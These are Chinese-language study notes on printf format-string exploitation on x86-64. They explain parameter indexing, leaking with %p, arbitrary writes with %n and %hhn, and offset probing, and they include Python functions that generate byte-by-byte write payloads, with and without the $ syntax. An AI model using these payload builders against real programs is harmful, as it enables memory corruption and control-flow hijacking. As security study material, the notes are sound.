- 格式字符串设置参数数量超过参数寄存器数量时，将使用栈
    - 函数调用前将额外参数压栈。空间从高到低为：

        主调函数栈底
        压栈的额外参数
        主调函数返回地址
        格式化函数栈区域
    
    - 格式字符串参数索引1对应 rsi，6个参数寄存器使用5个索引，从索引6开始使用栈中的额外参数。若无额外参数传递，则索引6对应主调函数栈底
- 核心概念：
    - printf 的额外参数索引越界后从主调函数栈底向高处，每8字节作为1块
    - 其中包含栈中的 printf 格式化字符串与其他自定义载荷
    - printf 的 %p 泄露作为参数的栈内容，%n 写入参数指针，自定义载荷输入任意地址。不常用的 %s 读取参数指针。从而实现格式化字符串的读写原语
    - 需探测字符串偏移以对齐指针到参数索引，并且定位自定义地址的索引基址
        - 格式字符串 - 填充到固定大小 - 变化的探测偏移 - 自定义独特数字/地址
        - 或需添加 `/n` `/x00` 独特分隔字符

常用转换说明符：
- `%x` 4字节16进制数
- `%p` 作为指针打印，形如 `0x...`
    - 打印字符计数包含 `0x` 前缀
- `%n` 将本次格式字符串之前打印的字符数**存储**到 `int *` 参数**指针指向的地址**
- `%s` **解引用指针**并打印字符串

长度修饰符：
- `hh` 1字节
- `h` 2字节
- `l` 8字节

字段宽度/填充：
- 第一位非零的**十进制数字**字符串，指定**最小字段宽度**
    - 计入打印字符数，精确控制 `%n` 指针参数所指地址存储的数字
- 动态宽度 `%*宽度参数索引$宽度转换说明符`
    - 使用参数索引设置最小字段宽度

参数控制：
- `%数字索引$转换符` 手动设置转换符对应的参数索引，即转换符的读写索引
    - 手动控制索引参数，解除参数寄存器顺序的限制
    - 多次使用相同索引参数
    - 写入数据到参数指针指向地址

tips：
- 两部分：参数寄存器保存的值，以及栈高地址的所有值
- 泄露
    - 使用栈参数索引泄露寄存器与栈高地址数据
    - 探测时
        - 每次开启新进程打印不同索引，进程地址不同仅查看栈保存的值的类型
        - 包含大量打印的一个载荷，打印出的地址为同一进程
    - 添加一些格式符 `\n` 以隔离泄露数据与其他字符串，搭配 `recvline`
- 在 `%n` 存储后，打印 -1/0/+1 索引的值调试，有时会出现计算错误的 +-1 偏差
- 多次输入时
    - 载荷后加空字节，确保多次输入时残留值不进入之后的格式化字符串
    - 若输入基址位置变化导致固定前缀变化（如修改 printf rdi 指针值），需再次探测指针对齐
- 不受控的前缀字符计数超过写入值
    - 长度修饰符将截断数值，于是 `%n` 的各种长度修饰符使用模数循环应对已存在的前缀
    - 写入多字节（1字节超出，写入2字节）
- 除常规的函数返回地址外，printf 本身的返回地址即可覆盖

去除 $ 符号：
- 批量取值函数从拥有自定义分隔符的 `%N$p` 修改为 `%p`，解析为列表后提取索引，注意列表与参数索引差1
- 探测函数从单次探测修改为批量探测，每轮保持格式字符串段的填充不变的同时增减偏移
- 写入函数从8字节中，从之前按照与当前字符计数的从小到大的乱序索引写入，修改为消耗索引到地址段后，更新当前字节计数，顺序写入
    - 初始从索引1到自定义索引的消耗格式字符与字节计数
    - 每轮载荷构建更新字节计数
        - 所有使用参数的格式符均消耗参数索引
        - 地址索引需同步构建，添加对应消耗参数索引的填充
- 注意，由于从1开始的大量格式化字符串，自定义载荷的位置将大幅变动，若格式化字符串数量过多，甚至可能超出字节限制导致探测失败
    - 由于地址段添加填充，载荷整体更长，注意长度限制

        ```py

        def per_byte_payload_build(target_addr_int, set_value, set_len, cur_ptr_index_base, cur_chr_count=0, no_doll=False):
            """
            %Nc%N$hhn  逐字节构建载荷

            返回构造的格式化字符串载荷、地址载荷，以及更新后的当前索引、当前字符计数


            target_addr_int 指针所指地址
            set_value   指针所指地址设置值
            set_len 设置字节长度

            cur_ptr_index_base  当前指针索引
            cur_chr_count   当前前缀长度
            no_doll 无 $ 符号模式
            """

            #### 构造格式字符串载荷

            # 提取覆盖的字节到列表，设置元组 (字节序索引，字节值)，从低位到高位，字节序索引对应小端序
            set_value_list = [
                (i, (set_value >> (i*8)) & 0xff)
                for i in range(set_len)
                ]
            
            if not no_doll:
                # 乱序索引，从小值开始构建填充格式字符串
                # set_value_list.sort(key=lambda x: (x[1] < cur_chr_count, x[1])) # 字节值大于当前索引在前并升序，字节值小于索引在后并升序
                set_value_list.sort(key=lambda x: ((x[1] - cur_chr_count) & 0xff)) # 或等效的按照模数距离排序

                # 持续更新当前字符计数
                payload_list = []
                for byte_index, byte_value  in set_value_list:

                    cur_index = cur_ptr_index_base + byte_index # 计算当前的实际空指针索引
                    
                    cur_chr_diff = (byte_value - cur_chr_count) % 0x100 # 计算填充字符数，负值时模数循环
                    
                    cur_fstr = ''
                    # 若当前填充对应则直接设置，否则添加前缀
                    if cur_chr_diff != 0:
                        cur_fstr += f'%{cur_chr_diff}c' # 构造前缀 fstr

                    cur_fstr += f'%{cur_index}$hhn' # 构造写入 fstr

                    payload_list.append(cur_fstr) # 添加到列表，最后合并

                    cur_chr_count = byte_value # 更新当前模数字节计数

                payload_fstr = ''.join(payload_list).encode() # 得到最终 fstr 载荷
                payload_fstr_len = len(payload_fstr)
                print(f"payload_fstr_len = {payload_fstr_len:#x}")

                #### 构造地址载荷
                
                payload_addr_list = [p64(target_addr_int + i) for i in range(set_len)]
                print(payload_addr_list)

                payload_addr = b''.join(payload_addr_list)
                payload_addr_len = len(payload_addr)
                print(f"payload_addr_len = {payload_addr_len:#x}")

                #### 返回构造的载荷，以及更新后的索引与计数

                cur_ptr_index_base += set_len # 更新下一个空指针索引

            
            else:
                # 若为非 $ 则顺序索引写入
                payload_list = []
                payload_addr_list = []
                for byte_index, byte_value  in set_value_list:
                    
                    cur_chr_diff = (byte_value - cur_chr_count) % 0x100 # 计算填充字符数，负值时模数循环
                    
                    cur_fstr = ''
                    # 若当前填充对应则直接设置，否则添加前缀
                    if cur_chr_diff != 0:
                        cur_fstr += f'%{cur_chr_diff}c' # 构造前缀 fstr
                        cur_ptr_index_base += 1 # 同步更新索引
                        payload_addr_list.append(p64(0)) # %c 消耗索引时添加填充地址

                    cur_fstr += f'%hhn' # 构造写入 fstr
                    # cur_fstr += f'%p' # 测试 fstr

                    cur_ptr_index_base += 1
                    payload_addr_list.append(p64(target_addr_int)) # 添加实际地址

                    payload_list.append(cur_fstr) # 添加到列表，最后合并

                    cur_chr_count = byte_value # 更新当前模数字节计数
                    target_addr_int += 1 # 更新地址
                
                # 得到最终载荷
                payload_fstr = ''.join(payload_list).encode() 
                payload_fstr_len = len(payload_fstr)
                print(f"payload_fstr_len = {payload_fstr_len:#x}")

                payload_addr = b''.join(payload_addr_list)
                payload_addr_len = len(payload_addr)
                print(f"payload_addr_len = {payload_addr_len:#x}")


            return payload_fstr, payload_addr, cur_ptr_index_base, cur_chr_count
            
        ```

        ```py
        @dataclass
        class set_packet:
            addr: int      
            value: int
            size: int

        def packet_payload_build(base_offset, align_offset, probe_index, probe_offset, cur_chr_count, set_packet_list, no_doll=False):
            """
            调用逐字节载荷构建函数，从构建包列表持续构建并传递参数以构建所有载荷

            base_offset 自定义 fstr 段大小
            align_offset, probe_index, probe_offset 探测索引与指针偏移
            cur_chr_count 当前字节计数
            set_packet_list 构建包，结构为 addr value size
            no_doll 无 $ 符号模式
            """
            total_just = base_offset + align_offset   # 设置字符串的指针偏移，使用与探测相同的8字节对齐基础上偏移
            cur_ptr_index_base = probe_index + (total_just - probe_offset)//8 # 使用 hit 时的状态，计算初始指针段的索引

            payload_fstr_list = []
            payload_addr_list = []

            
            dep_fstr = b''
            if no_doll:
                # 若为非 $ 则构建对于自定义地址索引的对应消耗格式字符串
                dep_count = cur_ptr_index_base-1 # 计算并添加消耗格式字符，直到自定义地址段开头
                dep_fstr += b'%c'*dep_count 
                cur_chr_count += dep_count # 并更新当前字节计数，%c 对应1
            
            payload_fstr_list.append(dep_fstr)

            for packet in set_packet_list: # 持续构建载荷并传递状态

                payload_fstr, payload_addr, cur_ptr_index_base, cur_chr_count = \
                        per_byte_payload_build(packet.addr, packet.value, packet.size, cur_ptr_index_base, cur_chr_count, no_doll)
                
                payload_fstr_list.append(payload_fstr)
                payload_addr_list.append(payload_addr)


            final_payload_fstr = b''.join(payload_fstr_list).ljust(total_just, b'\x00') 
            final_payload_addr = b''.join(payload_addr_list)

            if len(final_payload_fstr) != total_just:
                raise ValueError("out range")

            payload = final_payload_fstr + final_payload_addr
            
            return payload
        ```
